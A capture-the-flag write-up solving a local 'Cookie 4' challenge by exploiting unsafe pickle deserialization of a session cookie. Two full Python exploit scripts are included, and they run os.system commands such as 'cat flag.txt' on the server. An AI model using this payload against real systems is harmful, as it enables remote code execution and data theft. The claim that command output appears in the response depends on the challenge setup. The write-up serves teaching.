# Cookie 4: The Pythonic Revenge - Solution

This document outlines the steps to solve the "Cookie 4" CTF challenge.

## 1. Initial Reconnaissance

First, we start the challenge by running `docker-compose up cookie4`. Navigating to the challenge URL (e.g., `http://localhost:5004`), we are presented with a new login page for "The Vault - Final Fortress". It seems our previous intrusions have led them to upgrade their systems.

## 2. Analyzing the Session Cookie

Just like in the previous challenges, let's inspect the cookies. We find a `session` cookie. The value appears to be Base64 encoded.

Let's decode it:

```bash
echo "YOUR_COOKIE_VALUE" | base64 -d
```

The output looks like gibberish, which is a strong hint that it's a serialized object, not just a simple string. Given the challenge is now in Python, this is likely a `pickle` string.

## 3. The Vulnerability: Unsafe Pickle Deserialization

Pickle is a Python library for serializing and deserializing Python objects. Deserializing user-controlled data with `pickle` is extremely dangerous because it can be tricked into executing arbitrary code. This is our entry point.

## 4. Crafting the Exploit

We need to create a malicious pickled object that, when deserialized by the server, will execute a command of our choosing. We can achieve this by creating a Python class with a `__reduce__` method. The `__reduce__` method tells `pickle` how to reconstruct the object, and we can abuse it to run system commands.

Here is the plan for our exploit script:
1.  Create a Python class that, when unpickled, executes a command.
2.  The `__reduce__` method of this class will return `(os.system, ('your_command_here',))`.
3.  We'll start with a simple command like `ls -la` to see what's in the current directory.
4.  Pickle an instance of this class.
5.  Base64 encode the pickled object.
6.  Send a request to the server with our malicious `session` cookie.

## 5. The Exploit Script

Here is a Python script to automate the process:

```python
import pickle
import base64
import requests
import os

class RCE:
    def __reduce__(self):
        # Command to be executed on the server
        cmd = 'ls -la' 
        return (os.system, (cmd,))

# Create an instance of our RCE class
pickled = pickle.dumps(RCE())

# Base64 encode the pickled object
encoded_pickle = base64.b64encode(pickled).decode('utf-8')

# The URL of the challenge
url = 'http://localhost:5004' # Change port if necessary

# Set the malicious cookie
cookies = {'session': encoded_pickle}

# Send the request
response = requests.get(url, cookies=cookies)

# Print the server's response
print(response.text)
```

Running this script, we should see the output of `ls -la` from the server's current directory in the response HTML.

## 6. Getting the Flag

Now that we have RCE, we can look for the flag. After running `ls -la`, we'll likely see a `flag.txt` file in the output.

Let's modify our exploit script to read the flag:

```python
import pickle
import base64
import requests
import os

class RCE:
    def __reduce__(self):
        # Command to read the flag
        cmd = 'cat flag.txt' 
        return (os.system, (cmd,))

# Create an instance of our RCE class
pickled = pickle.dumps(RCE())

# Base64 encode the pickled object
encoded_pickle = base64.b64encode(pickled).decode('utf-8')

# The URL of the challenge
url = 'http://localhost:5004' # Change port if necessary

# Set the malicious cookie
cookies = {'session': encoded_pickle}

# Send the request
response = requests.get(url, cookies=cookies)

# Print the server's response, which should contain the flag
print(response.text)
```

Running the updated script will print the page content, which will now include the flag. The challenge is solved!
